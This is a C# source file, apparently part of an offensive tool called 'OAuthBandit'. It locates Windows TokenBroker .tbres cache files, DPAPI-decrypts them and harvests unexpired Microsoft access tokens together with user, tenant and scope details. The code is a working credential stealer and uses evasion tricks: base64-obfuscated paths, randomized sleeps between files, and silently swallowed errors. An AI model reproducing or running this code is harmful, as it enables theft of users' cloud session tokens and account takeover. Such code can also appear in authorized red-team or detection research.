using System.Text;
using OAuthBandit.Core;
using OAuthBandit.Crypto;

namespace OAuthBandit.Extractors;

// extracts tokens from the TokenBroker .tbres cache files
// these are dpapi encrypted blobs with base64 jwt's inside
public class TBResExtractor : BaseExtractor
{
    private static readonly Random _rng = new();
    private readonly string _cachePath;

    public TBResExtractor()
    {
        _cachePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            CryptoUtils.DecodeBase64(Constants.EncodedMicrosoft),
            CryptoUtils.DecodeBase64(Constants.EncodedTokenBroker),
            CryptoUtils.DecodeBase64(Constants.EncodedCache)
        );
    }

    public override List<Token> Extract()
    {
        var tokens = new List<Token>();

        if (!Directory.Exists(_cachePath))
        {
            Console.WriteLine("    ! tbres cache missing");
            return tokens;
        }

        var tbresFiles = Directory.GetFiles(_cachePath, "*.tbres");
        Console.WriteLine($"    > {tbresFiles.Length} .tbres files");

        foreach (var filePath in tbresFiles)
        {
            Thread.Sleep(_rng.Next(30, 120));
            try
            {
                var fileTokens = ProcessFile(filePath);
                tokens.AddRange(fileTokens);
            }
            catch { }
        }

        return tokens;
    }

    private List<Token> ProcessFile(string filePath)
    {
        var tokens = new List<Token>();
        var fileBytes = File.ReadAllBytes(filePath);

        // try utf8 first, fallback to utf16 - some files are wierd
        string fileContent;
        var utf8Text = Encoding.UTF8.GetString(fileBytes);
        if (utf8Text.Contains("ResponseBytes", StringComparison.Ordinal))
            fileContent = utf8Text;
        else
            fileContent = Encoding.Unicode.GetString(fileBytes);

        fileContent = fileContent.TrimStart('\uFEFF').TrimEnd('\0', '\r', '\n', ' ');

        int responseIdx = fileContent.IndexOf("ResponseBytes", StringComparison.OrdinalIgnoreCase);
        if (responseIdx == -1)
            return TryFallbackDecrypt(fileContent, filePath);

        var afterResponse = fileContent[responseIdx..];
        // find the Value feild
        int valueIdx = afterResponse.IndexOf("Value", StringComparison.OrdinalIgnoreCase);
        if (valueIdx == -1) return tokens;

        // grab base64 blob after Value
        int colonIdx = afterResponse.IndexOf(':', valueIdx);
        if (colonIdx == -1) colonIdx = afterResponse.IndexOf('>', valueIdx); // XML format
        if (colonIdx == -1) return tokens;

        // skip whitespace and qoutes
        int contentStart = colonIdx + 1;
        while (contentStart < afterResponse.Length && (afterResponse[contentStart] == ' ' || afterResponse[contentStart] == '"' || afterResponse[contentStart] == '\r' || afterResponse[contentStart] == '\n'))
            contentStart++;

        // find where base64 ends
        int contentEnd = contentStart;
        while (contentEnd < afterResponse.Length && afterResponse[contentEnd] != '"' && afterResponse[contentEnd] != '<' && afterResponse[contentEnd] != '\r' && afterResponse[contentEnd] != '\n')
            contentEnd++;

        var base64Value = afterResponse[contentStart..contentEnd].Trim();
        if (string.IsNullOrEmpty(base64Value) || base64Value.Length < 50) return tokens;

        try
        {
            var encrypted = Convert.FromBase64String(base64Value);
            var decrypted = CryptoUtils.DpapiDecrypt(encrypted);
            if (decrypted == null) return TryFallbackDecrypt(fileContent, filePath);

            var decryptedText = Encoding.UTF8.GetString(decrypted);
            ExtractTokensFromDecrypted(decryptedText, filePath, tokens);
        }
        catch { }

        // if normal parse got nothing, try fallback
        if (tokens.Count == 0)
            return TryFallbackDecrypt(fileContent, filePath);

        return tokens;
    }

    // fallback: find any big base64 blob in the file and try dpapi on it
    private List<Token> TryFallbackDecrypt(string fileContent, string filePath)
    {
        var tokens = new List<Token>();
        var match = Constants.LargeBase64Pattern.Match(fileContent);
        if (!match.Success) return tokens;

        try
        {
            var encrypted = Convert.FromBase64String(match.Groups[1].Value);
            var decrypted = CryptoUtils.DpapiDecrypt(encrypted);
            if (decrypted == null) return tokens;

            var text = Encoding.UTF8.GetString(decrypted);
            ExtractTokensFromDecrypted(text, filePath, tokens);
        }
        catch { }
        return tokens;
    }

    private void ExtractTokensFromDecrypted(string decryptedText, string filePath, List<Token> tokens)
    {
        // grab all JWT's from the decrypted content
        var jwts = Constants.JwtPattern.Matches(decryptedText)
            .Cast<System.Text.RegularExpressions.Match>()
            .Select(m => m.Groups[1].Value)
            .Distinct()
            .ToList();

        // first jwt is usually the id_token, second is the access_token
        // but we check the header to be sure
        foreach (var jwt in jwts)
        {
            // check if its an id_token (alg:none in header)
            bool isIdToken = false;
            try
            {
                var header = Encoding.UTF8.GetString(CryptoUtils.DecodeBase64Url(jwt.Split('.')[0]));
                isIdToken = header.Contains("\"none\"") || header.Contains("\"alg\":\"none\"");
            }
            catch { }

            if (isIdToken) continue; // skip id tokens, we want access tokens

            var token = CreateTokenFromJwt(jwt, filePath, ExtractScopeFromText(decryptedText));
            if (token != null) tokens.Add(token);
        }
    }

    // grab scope from the decrypted content if jwt doesnt have it
    private static readonly System.Text.RegularExpressions.Regex ScopeRegex =
        new(@"[""']?scope[""']?\s*[:=]\s*[""']?([^""'\r\n]+)[""']?", System.Text.RegularExpressions.RegexOptions.IgnoreCase | System.Text.RegularExpressions.RegexOptions.Compiled);

    private static string? ExtractScopeFromText(string text)
    {
        var m = ScopeRegex.Match(text);
        return m.Success ? m.Groups[1].Value.Trim() : null;
    }

    private Token? CreateTokenFromJwt(string jwt, string filePath, string? fallbackScope = null)
    {
        var payload = ParseJwtPayload(jwt);
        if (payload == null) return null;

        var clientId = GetClientIdWithAudFallback(payload);
        var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
        var tenantId = GetJsonString(payload, "tid", "tenant_id");
        var scope = GetJsonString(payload, "scp", "scope") ?? fallbackScope;

        if (!IsMicrosoftToken(clientId, scope, upn, jwt)) return null;

        string? expiresAt = null;
        bool isExpired = false;
        var exp = GetJsonLong(payload, "exp");
        if (exp.HasValue)
        {
            var expDt = DateTimeOffset.FromUnixTimeSeconds(exp.Value).LocalDateTime;
            expiresAt = expDt.ToString("yyyy-MM-dd HH:mm:ss");
            isExpired = expDt < DateTime.Now;
        }
        if (isExpired) return null;

        var application = IdentifyApplication(clientId, scope);
        var token = new Token
        {
            TokenType = "access_token",
            TokenValue = jwt,
            Application = application,
            ClientId = clientId,
            Upn = upn,
            TenantId = tenantId,
            Scope = scope,
            SourceFile = Path.GetFileName(filePath),
            CachePath = filePath,
            SourceType = "TBRES",
            ExtractedAt = ExtractedAt,
            ExpiresAt = expiresAt,
            IsExpired = isExpired,
            DisplayName = GetJsonString(payload, "name"),
            UserOid = GetJsonString(payload, "oid"),
            Audience = GetJsonString(payload, "aud")
        };
        token.CheckOfficeMaster();
        return token;
    }
}
